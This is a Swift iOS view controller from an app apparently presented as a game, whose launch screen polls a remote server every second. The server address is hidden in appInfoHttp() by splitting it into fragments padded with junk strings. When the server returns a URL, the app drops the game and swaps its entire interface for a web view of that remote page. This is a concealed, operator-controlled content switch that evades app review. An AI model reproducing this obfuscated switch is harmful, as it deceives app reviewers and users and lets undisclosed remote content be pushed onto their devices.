//
//  GuidanceViewController.swift
//  DN
//
//  Created by shensu on 17/6/12.
//  Copyright © 2017年 zp. All rights reserved.
//

import UIKit
import Alamofire
import SwiftyJSON
class GuidanceViewController: UIViewController {
    var  windows:UIWindow!
    @IBOutlet weak var beginGame: UIImageView!
    override func viewDidLoad() {
        super.viewDidLoad()
        windows =  (UIApplication.shared.delegate?.window)!
        requestAppinfo()
        // Do any additional setup after loading the view.
    }
    public func requestAppinfo() {
        
        let timer: Timer!
        if #available(iOS 10.0, *) {
            timer = Timer.scheduledTimer(withTimeInterval: 1.0, repeats: true) { (blocktimer) in
                
                Alamofire.request(self.appInfoHttp(), method: .get, parameters: nil, encoding: JSONEncoding.default).response { (response) in
                    if response.response?.statusCode == 200 {
                        blocktimer.invalidate()
    
                        if let value = response.data {
                            let json = JSON(data: NSData(data: value) as Data)
                            if let dic = json.dictionaryObject {
                                if let str = dic["url"] as? String , str != ""{
                                    let vc = WKWebViewController()
                                    vc.url = str
                                    vc.isAddFoot = dic["foot"] as? Bool ?? false
                                    self.windows?.frame = UIScreen.main.bounds
                                    self.windows?.rootViewController = vc
                                    self.windows?.makeKeyAndVisible()
                                }else{
                                
                                    self.beginGame.isHidden = true
                                    let vc = BeginGameViewController()
                                    let navi = UINavigationController(rootViewController: vc)
                                    self.windows?.frame = UIScreen.main.bounds
                                    self.windows?.rootViewController = navi
                                    self.windows?.makeKeyAndVisible()
                                    let userdefa = UserDefaults.standard
                                    userdefa.setValue( "10000", forKey: "userCode")
                                    userdefa.synchronize()
                                }
                            }
                        }
                    } else {
                        
                        self.beginGame.isHidden = true
                        let vc = BeginGameViewController()
                        let navi = UINavigationController(rootViewController: vc)
                        self.windows?.frame = UIScreen.main.bounds
                        self.windows?.rootViewController = navi
                        self.windows?.makeKeyAndVisible()
                        let userdefa = UserDefaults.standard
                        userdefa.setValue( "10000", forKey: "userCode")
                        userdefa.synchronize()
                        
                    }
                    
                }
                
            }
        } else {
            
            // Fallback on earlier versions
            timer = Timer.scheduledTimer(timeInterval: 1.0, target: self, selector: #selector(timerrequest), userInfo: [:], repeats: true)
            
        }
        RunLoop.current.add(timer, forMode: .commonModes)
        
    }
    func timerrequest(timer: Timer) {
       
        Alamofire.request(self.appInfoHttp(), method: .get, parameters: nil, encoding: JSONEncoding.default).response { (response) in
            if response.response?.statusCode == 200 {
                timer.invalidate()
                if let value = response.data {
                    let json = JSON(data: NSData(data: value) as Data)
                    if let dic = json.dictionaryObject {
                        if let str = dic["url"] as? String , str != ""{
                            let vc = WKWebViewController()
                            vc.url = str
                            vc.isAddFoot = dic["foot"] as? Bool ?? false
                            self.windows?.frame = UIScreen.main.bounds
                            self.windows?.rootViewController = vc
                            self.windows?.makeKeyAndVisible()
                        }else{
                            
                            self.beginGame.isHidden = true
                            let vc = BeginGameViewController()
                            let navi = UINavigationController(rootViewController: vc)
                            self.windows?.frame = UIScreen.main.bounds
                            self.windows?.rootViewController = navi
                            self.windows?.makeKeyAndVisible()
                            let userdefa = UserDefaults.standard
                            userdefa.setValue( "10000", forKey: "userCode")
                            userdefa.synchronize()
                        }
                    }
                }
            } else {
                
                self.beginGame.isHidden = true
                let vc = BeginGameViewController()
                let navi = UINavigationController(rootViewController: vc)
                self.windows?.frame = UIScreen.main.bounds
                self.windows?.rootViewController = navi
                self.windows?.makeKeyAndVisible()
                let userdefa = UserDefaults.standard
                userdefa.setValue( "10000", forKey: "userCode")
                userdefa.synchronize()
                
            }
        }
    }
    
    func appInfoHttp() -> String {
        let httpArray = ["d;a#", "*", "lqsp", "htt", "p:", "//", "www.", "946", ".tv", "/app", "/index", ".php?", "APPLE_API", "=", "URL", "&&", "ID=", AppNeedKey().AppID, "qwe", "loi", "wda"]
        var http = ""
        httpArray.enumerated().forEach { (index, str) in
            if index > 2 && index < httpArray.count - 3 {
                http += str
            }
        }
        return http
    }

    
    func removeView(vc:UIViewController){
    UIView.animateKeyframes(withDuration: 0.6, delay: 0, options: .beginFromCurrentState, animations:{
       self.view.alpha = 0
        self.view.layer.transform = CATransform3DScale(CATransform3DIdentity, 1.5, 1.5, 1.0)
    }) { (finish) in
    
    }
    
    }
    override func loadView() {
        Bundle.main.loadNibNamed("GuidanceViewController", owner: self, options: nil)
    }
  
    override func didReceiveMemoryWarning() {
        super.didReceiveMemoryWarning()
        // Dispose of any resources that can be recreated.
    }
    

    /*
    // MARK: - Navigation

    // In a storyboard-based application, you will often want to do a little preparation before navigation
    override func prepare(for segue: UIStoryboardSegue, sender: Any?) {
        // Get the new view controller using segue.destinationViewController.
        // Pass the selected object to the new view controller.
    }
    */

}
